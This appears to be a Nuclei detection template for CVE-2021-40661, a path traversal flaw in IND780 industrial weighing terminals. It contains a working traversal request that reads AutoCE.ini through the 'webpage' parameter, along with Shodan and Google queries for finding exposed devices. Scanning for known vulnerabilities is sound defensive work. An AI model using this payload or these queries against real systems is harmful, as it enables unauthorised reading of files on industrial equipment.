id: CVE-2021-40661

info:
  name: IND780 - Local File Inclusion
  author: For3stCo1d
  severity: high
  description: |
    IND780 Advanced Weighing Terminals Build 8.0.07 March 19, 2018 (SS Label 'IND780_8.0.07'), Version 7.2.10 June 18, 2012 (SS Label 'IND780_7.2.10') is vulnerable to unauthenticated local file inclusion. It is possible to traverse the folders of the affected host by providing a relative path to the 'webpage' parameter in AutoCE.ini. This could allow a remote attacker to access additional files on the affected system.
  reference:
    - https://sidsecure.au/blog/cve-2021-40661/?_sm_pdc=1&_sm_rid=MRRqb4KBDnjBMJk24b40LMS3SKqPMqb4KVn32Kr
    - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-40661
    - https://www.mt.com/au/en/home/products/Industrial_Weighing_Solutions/Terminals-and-Controllers/terminals-bench-floor-scales/advanced-bench-floor-applications/IND780/IND780_.html#overviewpm
    - https://nvd.nist.gov/vuln/detail/CVE-2021-40661
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
    cvss-score: 7.5
    cve-id: CVE-2021-40661
    cwe-id: CWE-22
  metadata:
    google-query: inurl:excalweb.dll
    shodan-query: IND780
    verified: "true"
  tags: cve,cve2021,ind780,lfi

requests:
  - method: GET
    path:
      - "{{BaseURL}}/IND780/excalweb.dll?webpage=../../AutoCE.ini"

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - 'ExePath=\Windows'
          - 'WorkDir=\Windows'
        condition: and

      - type: status
        status:
          - 200

# Enhanced by mp on 2023/01/15
